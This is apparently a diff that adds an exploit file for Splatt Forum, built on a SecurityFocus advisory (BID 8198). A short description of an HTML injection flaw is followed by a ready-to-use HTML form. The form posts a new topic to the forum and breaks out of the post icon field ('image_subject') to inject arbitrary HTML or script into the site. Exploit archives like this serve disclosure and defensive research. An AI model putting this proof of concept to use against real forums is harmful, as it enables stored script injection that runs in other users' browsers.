@@ -1,0 +1,30 @@
+source: http://www.securityfocus.com/bid/8198/info
+
+Splatt Forum has been reported prone to a HTML injection vulnerability.
+
+An attacker may save a Splatt Forum post form, and modify it so that the post icon value contains arbitrary attacker supplied HTML code. As a result, a malicious user may have the ability to submit a post to the site containing embedded script code. This code would be executed by a user's browser in the context of the vulnerable site. 
+
+<html>
+<body>
+<script>
+<!-- Modify here -->
+var address='http://www.splatt.it/gate.html?mop=modload&name=Forums&file=newtopic';
+</script>
+
+<!-- Exploit form -->
+<script>
+document.write("<form action="+address+" method='post' name='coolsus'>");
+</script>
+Numero forum: <input type=text name=forum value=1 size=3><br>
+Username: <input CLASS=textbox TYPE="TEXT" NAME="username" SIZE="25" MAXLENGTH="40"><br>
+Password: <input CLASS=textbox TYPE="PASSWORD" NAME="password" SIZE="25" MAXLENGTH="25"><br>
+Soggetto: <input CLASS=textbox TYPE="TEXT" NAME="subject" SIZE="75" MAXLENGTH="75"><br>
+Messaggio:<br><textarea name="message" rows="10" cols="75" wrap="VIRTUAL">&lt;/textarea&gt;<br>
+<input type=hidden name=bbcode value=0>
+<input type=hidden name=smile value=0>
+<input type=hidden name=notify value=0>
+<b>Inject code:</b> <input type=text name=image_subject value='icon1.gif">HTML CODE<!-- "' size=100><br>
+<input type="submit" name="submit" value=Invia class="Button">
+</form>
+</body>
+</html>
